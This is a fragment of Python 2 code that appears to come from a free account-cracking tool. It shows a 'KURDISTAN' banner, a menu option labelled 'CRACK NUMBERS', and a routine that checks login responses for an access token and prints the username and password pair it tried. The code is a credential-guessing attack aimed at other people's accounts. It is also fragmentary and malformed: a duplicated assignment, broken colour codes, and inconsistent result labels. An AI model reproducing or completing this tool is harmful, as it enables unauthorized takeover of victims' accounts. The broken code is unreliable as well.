...
logo = logo = '\n\x1b[1;94               6  9  G  A  M  I  N  G  \n\n\x1b[1;94          K  U  R  D  I  S  T  A  N@IM_KURDSH\n'
back = 0
successful = []
cpb = []
oks = []
...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m~'
    print '\x1b[1;91m[1]\x1b[1;92m FREE TOOLS 69 GAMING   \x1b[1;91m\xe2\x87\x8b  \x1b[1;93m CRACK NUMBERS '
    print 42 * '\x1b[1;91m~'
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;91m[NOT HACK]\x1b[1;91m ' + k + c + user + '  NO  ' + pass1 + '\n' + '\n'
